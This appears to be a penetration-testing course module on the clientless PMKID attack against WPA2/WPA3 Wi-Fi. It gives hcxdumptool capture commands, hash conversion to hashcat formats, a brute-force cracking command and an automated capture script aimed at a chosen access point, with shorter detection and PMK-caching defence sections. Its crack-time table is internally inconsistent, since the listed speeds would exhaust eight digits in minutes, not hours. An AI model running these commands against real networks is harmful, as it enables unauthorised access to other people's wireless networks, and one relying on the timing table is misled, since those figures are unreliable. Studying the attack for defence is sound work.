# Module 04 — PMKID Attack

## 4.1 Vulnerability: PMKID Caching

### Technical Details

**Affected**: WPA2/WPA3 with PMK caching enabled  
**Researcher**: Jens Steube (hashcat)  
**Attack Type**: Clientless handshake capture

### PMKID Structure

```
PMKID = HMAC-SHA1-128(PMK, "PMK Name" | MAC_AP | MAC_STA)

Where:
- PMK = Pairwise Master Key (from 4-way handshake or EAP)
- MAC_AP = AP MAC address
- MAC_STA = Client MAC address
- "PMK Name" = static string
```

### Capture Mechanism

```
Association Request: Client → AP
Association Response: AP → Client [Contains PMKID in RSN IE]

Capture: Just this 1 frame (no client required)
```

---

## 4.2 hcxdumptool Usage

### Installation

```bash
sudo apt install hcxdumptool hcxtools
```

### Clientless Capture

```bash
# Scan for vulnerable APs
sudo hcxdumptool -i wlan0mon -o capture.pcapng --enable_status=1

# Target specific channel
sudo hcxdumptool -i wlan0mon -c 6 -o capture.pcapng --enable_status=1

# Filter by BSSID
sudo hcxdumptool -i wlan0mon --filterlist_ap=target.txt -o capture.pcapng
```

### Output Analysis

```bash
# Convert to hashcat format
hcxpcapngtool -o hash.hc22000 -E wordlist.txt capture.pcapng

# Check what was captured
hcxpcapngtool -z info.txt capture.pcapng
cat info.txt
```

---

## 4.3 Hash Conversion

### Modern Format (22000)

```bash
# Convert capture to hashcat 22000
hcxpcapngtool -o output.hc22000 capture.pcapng

# Multiple captures
hcxpcapngtool -o combined.hc22000 *.pcapng

# Verify conversion
head -1 output.hc22000
# Format: WPA*02*PMKID*MAC_AP*MAC_STA*ESSID...
```

### Legacy Format (16800)

```bash
# PMKID only (no EAPOL)
hcxpcapngtool -o output.16800 capture.pcapng

hashcat -a 3 -m 16800 output.16800 ?d?d?d?d?d?d?d?d
```

---

## 4.4 Crack Speed Reference

| GPU | Mode 22000 Speed | Time to Crack 8 digits |
|-----|-----------------|----------------------|
| RTX 4090 | ~900 kH/s | 3 hours |
| RTX 3080 | ~400 kH/s | 7 hours |
| RTX 3060 | ~150 kH/s | 18 hours |
| GTX 1080 | ~80 kH/s | 35 hours |

---

## 4.5 Detection: PMKID Capture

### AP Logs

```
[2024-01-15 14:30:12] Association request from unknown device
[2024-01-15 14:30:12] EAPOL-Key timeout
[2024-01-15 14:30:15] Association request from unknown device
[2024-01-15 14:30:15] EAPOL-Key timeout
```

### Pattern Analysis

| Signature | Indicator |
|-----------|-----------|
| Association without data | PMKID capture attempt |
| Rapid associations | Automated tool (hcxdumptool) |
| Multiple MACs | MAC rotation for repeated capture |

---

## 4.6 Defense: Disable PMK Caching

### Configuration

```
# Cisco WLC
config network pmk-cache disable

# Aruba
wlan ssid-profile "Corporate"
  pmkcache disable

# hostapd
disable_pmksa_caching=1
```

### 802.11r (Fast Transition) Considerations

```
802.11r FT uses different key derivation
Not vulnerable to PMKID attack
But may have other vulnerabilities
```

---

## 4.7 PoC: Automated PMKID Capture

```bash
#!/bin/bash
# pmkid-capture.sh

BSSID=$1
CHANNEL=$2
INTERFACE=${3:-wlan0mon}

# Create filter file
echo "$BSSID" > /tmp/target.txt

# Capture
sudo hcxdumptool -i "$INTERFACE" -c "$CHANNEL" \
    --filterlist_ap=/tmp/target.txt \
    -o /tmp/pmkid-capture.pcapng \
    --enable_status=1

# Convert
hcxpcapngtool -o /tmp/pmkid-hash.hc22000 /tmp/pmkid-capture.pcapng

# Check result
if [ -s /tmp/pmkid-hash.hc22000 ]; then
    echo "[+] PMKID captured!"
    cat /tmp/pmkid-hash.hc22000
else
    echo "[!] No PMKID found"
    echo "[!] AP may not support PMK caching"
fi
```

---

**Next**: [Module 05 — Client-Side Attacks](05-client-attacks.md)
